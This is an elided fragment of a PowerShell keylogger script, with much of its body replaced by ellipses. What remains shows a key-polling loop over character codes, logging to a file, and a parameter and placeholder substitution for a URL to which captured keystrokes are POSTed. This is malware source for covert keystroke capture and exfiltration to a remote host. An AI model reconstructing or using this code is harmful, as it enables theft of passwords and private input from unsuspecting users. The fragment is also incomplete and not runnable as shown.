...
.PARAMETER HttpUrl
    ...
    Specifies the URL to POST the keys
    ...
    $Initilizer = {
        ...
        function KeyLog {
            ...
            Start-Sleep -Milliseconds 40
                ...
                try
                {
                    ...
                    for ($TypeableChar = 1; $TypeableChar -le 254; $TypeableChar++)
                    {
                        ...
                        if (($KeyResult -band 0x8000) -eq 0x8000)
                        {
                            ...
                            $bytes = [System.Text.Encoding]::ASCII.GetBytes($CSVEntry);
                ...
                {
                    Out-File -FilePath $LogPath -Append -InputObject $_.Exception
                }
            }
        }

    $Initilizer = [ScriptBlock]::Create(($Initilizer -replace 'REPLACEME', $LogPath))
    $Initilizer = [ScriptBlock]::Create(($Initilizer -replace 'GETYOURPENUTSHERE', $HttpUrl))
